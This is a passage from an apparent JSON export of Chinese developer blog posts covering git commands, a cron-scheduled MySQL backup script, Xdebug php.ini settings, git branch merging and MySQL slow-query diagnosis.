auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git reset --hard # 恢复最近一次提交过的状态，即放弃上次提交后的所有本次修改</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git ci &lt;file&gt; git ci . git ci -a # 将git add, git rm和git ci等操作都合并在一起做</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git ci --amend # 修改最后一次提交记录</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git revert &lt;$id&gt; # 恢复某次提交的状态，恢复动作本身也创建次提交对象</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git revert HEAD # 恢复最后一次提交的状态</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\"><br></span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"margin:0px;padding:0px;background-color:rgb(255,255,255);\"><span style=\"font-family:SimSun;font-size:18px;\"><strong>查看文件diff</strong></span></span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git diff &lt;file&gt; # 比较当前文件和暂存区文件差异 git diff</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git diff &lt;<span class=\"MathJax\" style=\"margin:0px;padding:0px;line-height:normal;word-spacing:normal;white-space:nowrap;float:none;min-width:0px;min-height:0px;border:0px;\"><span class=\"math\" style=\"margin:0px;padding:0px;border:0px;vertical-align:0px;line-height:normal;width:4.115em;\"><span style=\"margin:0px;padding:0px;border:0px;vertical-align:0px;line-height:normal;width:3.087em;height:0px;\"><span style=\"margin:0px;padding:0px;border:0px;vertical-align:0px;line-height:normal;\"><span class=\"mrow\" style=\"margin:0px;padding:0px;border:0px;vertical-align:0px;line-height:normal;\"><span class=\"mi\" style=\"margin:0px;padding:0px;border:0px;vertical-align:0px;line-height:normal;\">i</span><span class=\"mi\" style=\"margin:0px;padding:0px;border:0px;vertical-align:0px;line-height:normal;\">d<span style=\"margin:0px;padding:0px;border:0px;vertical-align:0px;line-height:normal;height:1px;width:.003em;\"></span></span><span class=\"mn\" style=\"margin:0px;padding:0px;border:0px;vertical-align:0px;line-height:normal;\">1</span><span class=\"mo\" style=\"margin:0px;padding:0px 0px 0px .273em;border:0px;vertical-align:0px;line-height:normal;\">&gt;<span style=\"margin:0px;padding:0px;border:0px;vertical-align:0px;line-height:normal;\">&lt;</span></span></span><span style=\"margin:0px;padding:0px;border:0px;vertical-align:0px;line-height:normal;width:0px;height:2.221em;\"></span></span></span><span style=\"margin:0px;padding:0px;border-width:0px;border-left-style:solid;vertical-align:-.139em;line-height:normal;width:0px;height:1.146em;\"></span></span><span class=\"MJX_Assistive_MathML\" style=\"margin:0px;padding:0px;border:0px;vertical-align:0px;line-height:normal;height:1px;width:1px;\">id1&gt;&lt;</span></span>id2&gt; # 比较两次提交之间的差异</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git diff &lt;branch1&gt;..&lt;branch2&gt; # 在两个分支之间比较</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git diff --staged # 比较暂存区和版本库差异</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git diff --cached # 比较暂存区和版本库差异</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git diff --stat # 仅仅比较统计信息</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\"><br></span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"margin:0px;padding:0px;background-color:rgb(255,255,255);\"><span style=\"font-family:SimSun;font-size:18px;\"><strong>查看提交记录</strong></span></span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git log git log &lt;file&gt; # 查看该文件每次提交记录</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git log -p &lt;file&gt; # 查看每次详细修改内容的diff</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git log -p -2 # 查看最近两次详细修改内容的diff</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git log --stat #查看提交统计信息</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\"><br></span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"margin:0px;padding:0px;background-color:rgb(255,255,255);\"><span style=\"font-family:SimSun;font-size:18px;\"><strong>tig</strong></span></span></p><p style=\"margin:10px auto;text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;\"><span style=\"color:rgb(57,57,57);background-color:rgb(255,255,255);\">Mac上可以使用tig代替diff和log，</span><code style=\"margin:0px;padding:0px;\"><span style=\"font-size:16px;color:#000000;background-color:rgb(255,255,255);\">brew install tig</span></code></span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\"><code style=\"margin:0px;padding:0px;\"><br></code></span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"margin:0px;padding:0px;background-color:rgb(255,255,255);\"><span style=\"font-family:SimSun;font-size:18px;\"><strong>Git 本地分支管理</strong></span></span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"margin:0px;padding:0px;background-color:rgb(255,255,255);\"><span style=\"font-family:SimSun;font-size:18px;\"><strong>查看、切换、创建和删除分支</strong></span></span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git br -r # 查看远程分支</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git br &lt;new_branch&gt; # 创建新的分支</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git br -v # 查看各个分支最后提交信息</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git br --merged # 查看已经被合并到当前分支的分支</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git br --no-merged # 查看尚未被合并到当前分支的分支</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git co &lt;branch&gt; # 切换到某个分支</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git co -b &lt;new_branch&gt; # 创建新的分支，并且切换过去</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git co -b &lt;new_branch&gt; &lt;branch&gt; # 基于branch创建新的new_branch</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git co $id # 把某次历史提交记录checkout出来，但无分支信息，切换到其他分支会自动删除</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git co $id -b &lt;new_branch&gt; # 把某次历史提交记录checkout出来，创建成一个分支</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git br -d &lt;branch&gt; # 删除某个分支</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git br -D &lt;branch&gt; # 强制删除某个分支 (未被合并的分支被删除的时候需要强制)</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\"><br></span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"margin:0px;padding:0px;background-color:rgb(255,255,255);\"><span style=\"font-family:SimSun;font-size:18px;\"><strong>分支合并和rebase</strong></span></span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git merge &lt;branch&gt; # 将branch分支合并到当前分支</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git merge origin/master --no-ff # 不要Fast-Foward合并，这样可以生成merge提交</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git rebase master &lt;branch&gt; # 将master rebase到branch，相当于： git co &lt;branch&gt; &amp;&amp; git rebase master &amp;&amp; git co master &amp;&amp; git merge &lt;branch&gt;</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\"><br></span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"margin:0px;padding:0px;background-color:rgb(255,255,255);\"><span style=\"font-family:SimSun;font-size:18px;\"><strong>Git补丁管理(方便在多台机器上开发同步时用)</strong></span></span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git diff &gt; ../sync.patch # 生成补丁</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git apply ../sync.patch # 打补丁</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git apply --check ../sync.patch #测试补丁能否成功</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\"><br></span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"margin:0px;padding:0px;background-color:rgb(255,255,255);\"><span style=\"font-family:SimSun;font-size:18px;\"><strong>Git暂存管理</strong></span></span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git stash # 暂存</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git stash list # 列所有stash</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git stash apply # 恢复暂存的内容</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git stash drop # 删除暂存区</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\"><br></span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"margin:0px;padding:0px;background-color:rgb(255,255,255);\"><span style=\"font-family:SimSun;font-size:18px;\"><strong>Git远程分支管理</strong></span></span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git pull # 抓取远程仓库所有分支更新并合并到本地</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git pull --no-ff # 抓取远程仓库所有分支更新并合并到本地，不要快进合并</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git fetch origin # 抓取远程仓库更新</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git merge origin/master # 将远程主分支合并到本地当前分支</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git co --track origin/branch # 跟踪某个远程分支创建相应的本地分支</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git co -b &lt;local_branch&gt; origin/&lt;remote_branch&gt; # 基于远程分支创建本地分支，功能同上</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git push # push所有分支</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git push origin master # 将本地主分支推到远程主分支</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git push -u origin master # 将本地主分支推到远程(如无远程主分支则创建，用于初始化远程仓库)</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git push origin &lt;local_branch&gt; # 创建远程分支， origin是远程仓库名</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git push origin &lt;local_branch&gt;:&lt;remote_branch&gt; # 创建远程分支</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git push origin :&lt;remote_branch&gt; #先删除本地分支(git br -d &lt;branch&gt;)，然后再push删除远程分支</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"margin:0px;padding:0px;background-color:rgb(255,255,255);\"><span style=\"font-family:SimSun;font-size:16px;\"><br></span></span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"margin:0px;padding:0px;background-color:rgb(255,255,255);\"><span style=\"font-family:SimSun;font-size:18px;\"><strong>Git远程仓库管理</strong></span></span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git remote -v # 查看远程服务器地址和仓库名称</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git remote show origin # 查看远程服务器仓库状态</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git remote add origin git@ github:robbin/robbin_site.git # 添加远程仓库地址</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git remote set-url origin git@ github.com:robbin/robbin_site.git # 设置远程仓库地址(用于修改远程仓库地址) git remote rm &lt;repository&gt; # 删除远程仓库</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\"><br></span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"margin:0px;padding:0px;background-color:rgb(255,255,255);\"><span style=\"font-family:SimSun;font-size:18px;\"><strong>创建远程仓库</strong></span></span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git clone --bare robbin_site robbin_site.git # 用带版本的项目创建纯版本仓库</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">scp -r my_project.git git@ git.csdn.net:~ # 将纯仓库上传到服务器上</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">mkdir robbin_site.git &amp;&amp; cd robbin_site.git &amp;&amp; git --bare init # 在服务器创建纯仓库</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git remote add origin git@ github.com:robbin/robbin_site.git # 设置远程仓库地址</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git push -u origin master # 客户端首次提交</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git push -u origin develop # 首次将本地develop分支提交到远程develop分支，并且track</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git remote set-head origin master # 设置远程仓库的HEAD指向master分支</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">也可以命令设置跟踪远程库和本地库</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git branch --set-upstream master origin/master</span></p><p style=\"margin:10px auto;color:rgb(57,57,57);text-align:left;\"><span style=\"font-family:SimSun;font-size:16px;background-color:rgb(255,255,255);\">git branch --set-upstream develop origin/develop</span></p>                                    </div>", "log_PostTime": 1584891067, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "数据库自动备份", "log_Intro": "数据库自动备份", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\"><strong>1.首先写一个备份ssh文件</strong><br style=\"margin:.2em;\">在你要的目录下创建一个备份文件夹，和一个备份文件。<br style=\"margin:.2em;\"></span></p><p><span style=\"font-size:16px;\"><span><img alt=\"\" src=\"https://box.kancloud.cn/a026fd6a0fc82c0899cce66526a1b511_320x98.png\" style=\"border:0px none;vertical-align:top;\"></span></span></p><p><span style=\"font-size:16px;\"><span><br></span></span></p><span style=\"font-size:16px;\"><strong>2.编辑这个备份文件，写一个ssh语句</strong><br style=\"margin:.2em;\">#!/bin/bash<br style=\"margin:.2em;\">DATE=$(date +%Y%m%d)<br style=\"margin:.2em;\"></span><p><span style=\"font-size:16px;\">mysqldump -uroot -proot coscia_00 &gt; /home/backup/cosica_00-$DATE.sql</span></p><p><span style=\"font-size:16px;\"><br></span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\"><strong>3.给这个ssh文件执行权限（必须设置）</strong><br style=\"margin:.2em;\"></span></p><p><span style=\"font-size:16px;\">chmod u+x /home/backup/erpbak.sh</span></p><p><span style=\"font-size:16px;\"><br></span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\"><strong>4、设置定时执行脚本任务，让系统每天执行</strong><br style=\"margin:.2em;\">crontab -e<br style=\"margin:.2em;\">#每天17:30执行（复制粘贴好些，有空格少了也不行的）<br style=\"margin:.2em;\">30 17 * * * /usr/sbin/mysql_dy_backup.sh</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">编辑完成按 esc键， 然后：wq! 强制退出。<br style=\"margin:.2em;\">可以试试在 /tmp 目录下找到crontab.WoImfj文件，编辑里面的内容。<br style=\"margin:.2em;\"><img alt=\"\" src=\"https://box.kancloud.cn/cd0bdebd2e9a1663f33b9ca4ab987db3_548x231.png\" style=\"border:0px none;vertical-align:top;\"></span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">到时间检查是否备份完成<br style=\"margin:.2em;\"><img alt=\"\" src=\"https://box.kancloud.cn/3ed93a31353f8fc50dcbd1e5027d4570_215x153.png\" style=\"border:0px none;vertical-align:top;\"></span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">成功！！！</span></p><p style=\"margin-bottom:0px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">关于crontab的说明：<a href=\"https://blog.csdn.net/chen_jianjian/article/details/48706465\" style=\"color:rgb(65,131,196);background-color:transparent;\">https://blog.csdn.net/chen_jianjian/article/details/48706465</a><br style=\"margin:.2em;\"><a href=\"https://www.cnblogs.com/emily1130/p/7345842.html\" rel=\"nofollow\" style=\"color:rgb(65,131,196);background-color:transparent;\">https://www.cnblogs.com/emily1130/p/7345842.html</a></span></p>                                    </div>", "log_PostTime": 1584891068, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "php.ini Xdebug配置", "log_Intro": "php.ini Xdebug配置", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1> </h1>\n\n<p>在此记录：</p>\n\n<p>xdebug.profiler_output_dir=\"D:\\phpStudy\\tmp\\xdebug\"<br>\nxdebug.trace_output_dir=\"D:\\phpStudy\\tmp\\xdebug\"<br>\nzend_extension=\"D:\\iphpStudy\\php\\php-5.6.27-nts\\ext\\php_xdebug.dll\"</p>\n\n<p>xdebug.profiler_enable = 1<br>\nxdebug.auto_trace = 1;<br>\nxdebug.show_exception_trace = 1<br>\n;这里必须设置为0，为了能使用浏览器插件 xdebug helper配合调试<br>\nxdebug.remote_autostart = 0 ;<br>\nxdebug.remote_enable = 1 ;<br>\n;这里是开启远程调试<br>\nxdebug.remote_handler = \"dbgp\" ;<br>\n;远程调试的host<br>\nxdebug.remote_host = \"127.0.0.1\" ;<br>\n;远程调试的端口号<br>\nxdebug.remote_port = 9000 ;<br>\n;远程调试的对应 key<br>\nxdebug.idekey=\"PHPSTORM\" ;</p>                                    </div>", "log_PostTime": 1584891070, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "git命令合并分支代码", "log_Intro": "git命令合并分支代码", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>对于复杂的系统，我们可能要开好几个分支来开发，那么怎样使用git合并分支呢？</p>\n\n<p>合并步骤：<br>\n1、进入要合并的分支（如开发分支合并到master，则进入master目录）<br>\ngit checkout master<br>\ngit pull</p>\n\n<p>2、查看所有分支是否都pull下来了<br>\ngit branch -a</p>\n\n<p>3、使用merge合并开发分支<br>\ngit merge 分支名</p>\n\n<p>4、查看合并之后的状态<br>\ngit status</p>\n\n<p>5、有冲突的话，通过IDE解决冲突；</p>\n\n<p>6、解决冲突之后，将冲突文件提交暂存区<br>\ngit add 冲突文件</p>\n\n<p>7、提交merge之后的结果<br>\ngit commit</p>\n\n<p>如果不是使用git commit -m \"备注\" ，那么git会自动将合并的结果作为备注，提交本地仓库；</p>\n\n<p>8、本地仓库代码提交远程仓库<br>\ngit push</p>\n\n<p>git将分支合并到分支，将master合并到分支的操作步骤是一样的。</p>                                    </div>", "log_PostTime": 1584891071, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "怎么查找执行比较慢的sql语句", "log_Intro": "怎么查找执行比较慢的sql语句", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>一、<a href=\"https://www.baidu.com/s?wd=MySQL%E6%95%B0%E6%8D%AE%E5%BA%93&amp;tn=SE_PcZhidaonwhc_ngpagmjz&amp;rsv_dl=gh_pc_zhidao\" rel=\"nofollow\">MySQL数据库</a>有几个配置选项可以帮助我们及时捕获低效SQL语句<br><br>\n1，slow_query_log<br>\n这个参数设置为ON，可以捕获执行时间超过一定数值的SQL语句。<br><br>\n2，long_query_time<br>\n当SQL语句执行时间超过此数值时，就会被记录到日志中，建议设置为1或者更短。<br><br>\n3，slow_query_log_file<br>\n记录日志的文件名。<br><br>\n4，log_queries_not_using_indexes<br>\n这个参数设置为ON，可以捕获到所有未使用索引的SQL语句，尽管这个SQL语句有可能执行得挺快。<br><br>\n二、检测mysql中sql语句的效率的方法<br><br>\n1、通过查询日志<br>\n（1）、Windows下开启MySQL慢查询<br>\nMySQL在<a href=\"https://www.baidu.com/s?wd=Windows%E7%B3%BB%E7%BB%9F&amp;tn=SE_PcZhidaonwhc_ngpagmjz&amp;rsv_dl=gh_pc_zhidao\" rel=\"nofollow\">Windows系统</a>中的配置文件一般是是my.ini找到[mysqld]下面加上<br>\n代码如下<br>\nlog-slow-queries = F:/MySQL/log/mysqlslowquery。log<br>\nlong_query_time = 2<br><br>\n（2）、Linux下启用MySQL慢查询<br>\nMySQL在Windows系统中的配置文件一般是是my.cnf找到[mysqld]下面加上<br>\n代码如下<br>\nlog-slow-queries=/data/mysqldata/slowquery。log<br>\nlong_query_time=2<br>\n说明<br>\nlog-slow-queries = F:/MySQL/log/mysqlslowquery。<br>\n为慢查询日志存放的位置，一般这个目录要有MySQL的运行帐号的可写权限，一般都将这个目录设置为MySQL的数据存放目录；<br>\nlong_query_time=2中的2表示查询超过两秒才记录；<br><br>\n2.show processlist 命令<br><br>\nSHOW PROCESSLIST显示哪些线程正在运行。您也可以使用mysqladmin processlist语句得到此信息。<br>\n各列的含义和用途：<br>\nID列<br>\n一个标识，你要kill一个语句的时候很有用，用命令杀掉此查询 /*/mysqladmin kill 进程号。<br>\nuser列<br>\n显示单前用户，如果不是root，这个命令就只显示你权限范围内的sql语句。<br>\nhost列<br>\n显示这个语句是从哪个ip的哪个端口上发出的。用于追踪出问题语句的用户。<br>\ndb列<br>\n显示这个进程目前连接的是哪个数据库。<br>\ncommand列<br>\n显示当前连接的执行的命令，一般就是休眠（sleep），查询（query），连接（connect）。<br>\ntime列<br>\n此这个状态持续的时间，单位是秒。<br>\nstate列<br>\n显示使用当前连接的sql语句的状态，很重要的列，后续会有所有的状态的描述，请注意，state只是语句执行中的某一个状态，一个 sql语句，以查询为例，可能需要经过copying to tmp table，Sorting result，Sending data等状态才可以完成<br>\ninfo列<br>\n显示这个sql语句，因为长度有限，所以长的sql语句就显示不全，但是一个判断问题语句的重要依据。<br><br>\n这个命令中最关键的就是state列，mysql列出的状态主要有以下几种：<br>\nChecking table<br>\n　正在检查数据表（这是自动的）。<br>\nClosing tables<br>\n　正在将表中修改的数据刷新到磁盘中，同时正在关闭已经用完的表。这是一个很快的操作，如果不是这样的话，就应该确认磁盘空间是否已经满了或者磁盘是否正处于重负中。<br>\nConnect Out<br>\n　复制从服务器正在连接主服务器。<br><br>\nCopying to tmp table on disk<br>\n　由于临时结果集大于tmp_table_size，正在将临时表从内存存储转为<a href=\"https://www.baidu.com/s?wd=%E7%A3%81%E7%9B%98%E5%AD%98%E5%82%A8&amp;tn=SE_PcZhidaonwhc_ngpagmjz&amp;rsv_dl=gh_pc_zhidao\" rel=\"nofollow\">磁盘存储</a>以此节省内存。<br>\nCreating tmp table<br>\n　正在创建临时表以存放部分查询结果。<br>\ndeleting from main table<br>\n　服务器正在执行多表删除中的第一部分，刚删除第一个表。<br>\ndeleting from reference tables<br>\n　服务器正在执行多表删除中的第二部分，正在删除其他表的记录。<br><br>\nFlushing tables<br>\n　正在执行FLUSH 